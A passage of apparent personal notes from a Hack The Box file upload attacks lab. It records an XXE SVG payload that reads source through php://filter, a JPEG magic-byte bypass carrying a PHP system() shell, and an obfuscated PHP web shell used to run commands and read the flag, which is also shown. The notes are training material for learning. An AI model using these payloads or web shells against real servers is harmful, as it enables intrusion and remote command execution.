{         echo "Only images are allowed";         die();     } }  // size test if ($_FILES["uploadFile"]["size"] &gt; 500000) {     echo "File too large";     die(); }  if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {     displayHTMLImage($target_file); } else {     echo "File failed to upload"; }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 279d0e45-67cd-4c36-a995-d1451af057f2 -->

> [!output]+ 🟨 Output 036
> HTTP/1.1 200 OK
> Date: Tue, 30 Dec 2025 20:04:30 GMT
> Server: Apache/2.4.41 (Ubuntu)
> Vary: Accept-Encoding
> Content-Length: 154
> Keep-Alive: timeout=5, max=100
> Connection: Keep-Alive
> Content-Type: text/html; charset=UTF-8
>
> &lt;?xml version="1.0" encoding="UTF-8"?&gt;
> &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt;
> &lt;svg&gt;&amp;xxe;&lt;/svg&gt;
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → visit uploaded file → GET /contact/user_feedback_submissions/251230_file.svg HTTP/1.1 Host: 83.136.254.84:34477 → HTTP/1.1 200 OK Date: Tue, 30 Dec 2025 20:04:30 GMT Server: Apache/2.4.41 (Ubuntu) Vary: Accept-Encoding Content-Length: 154 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 133d9341-b71c-44d3-8aba-f89d4a95b341 -->

> [!output]+ 🟨 Output 037
> Only images are allowed
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → Upload php file → Add signature of jpg to bypass MIME → ÿØÿà → Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Length: 232  ------WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Disposition: form-data; name="uploadFile"; filename="sh.phar.jpg" Content-Type: image/jpeg  ÿØÿà  &lt;?php system($ REQUEST('cmd' ]); ?&gt; ------WebKitFormBoundaryYw282xkhpYBFgOAQ-- → Only images are allowed
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ff8367c3-a989-4506-8bd4-a47042b85a10 -->

> [!output]+ 🟨 Output 038
> ÿØÿÛ
>
> Enabled Function:
> &lt;br/&gt;system exec shell_exec passthru &lt;br/&gt;
> Using system as shell command
> &lt;br/&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → Upload php file → send malicioud PHP → use the php web shell from seclists named another-obfusctaed-phpshell.php or Dysco.php → Dysco.php → GET /contact/user_feedback_submissions/251231_saudi.phar.jpg?cmd=id HTTP/1.1 Host: 94.237.123.185:56456 → ÿØÿÛ  Enabled Function: &lt;br/&gt;system exec shell_exec passthru &lt;br/&gt; Using system as shell command &lt;br/&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8522da4f-8d0a-4e87-8ddd-7fbb24b08860 -->

> [!output]+ 🟨 Output 039
> ÿØÿÛ
>
> HTB{m4573r1ng_upl04d_3xpl0174710n}
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → Upload php file → send malicioud PHP → use the php web shell from seclists named another-obfusctaed-phpshell.php or Dysco.php → ------WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Disposition: form-data; name="uploadFile"; filename="saudi.phar.jpg" Content-Type: image/jpeg  ÿØÿÛ  &lt;?php // Usage example: GET /another_obfuscated_phpshell.php?lol=ls%20-al $S=array(m("ncoai","msyte", "cocain"),m("sir","cex","iris"),m("otab","lshe","taboo")."_".m("sir","cex","iris"),m("gbledin","upasthr","bleeding")); $TR=m("etroubl","edisabl","trouble");$MK=m("dpreambl","sfunctio","preambled");$D=explode(",",ini_get($TR.'_'.$MK));$P=$_REQUEST; function m($a,$b,$c) {return str_replace(str_split($a), str_split($b), $c);} foreach($S as $A) {     if(!in_array($A, $D)) {         if($A == m("ncoai","msyte","cocain")) $A($P['lol']);         elseif($A == m("sir","cex","iris")) {             exec("$P 2&gt;&amp;1", $arr);             echo join("\n",$arr)."\n";         } else echo $A($P['lol']);         exit;     } } ------WebKitFormBoundaryYw282xkhpYBFgOAQ-- → GET /contact/user_feedback_submissions/251231_saudi.phar.jpg?lol=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt HTTP/1.1 Host: 94.237.123.185:56456 → ÿØÿÛ  HTB{m4573r1ng_upl04d_3xpl0174710n}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 72a7d274-cc70-4f6f-bbb4-14a358834c30 -->
